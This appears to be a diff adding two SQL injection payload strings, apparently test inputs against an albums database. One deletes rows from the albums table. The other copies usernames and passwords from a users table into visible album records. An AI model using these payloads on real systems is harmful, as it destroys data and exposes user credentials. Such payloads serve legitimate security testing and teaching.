@@ -1,0 +1,2 @@
+injection1');delete from albums where artist = 'Frank Sinatra'; -- 
+injection2');insert into albums (title,artist,genre) select username,'null',pass from users; -- 
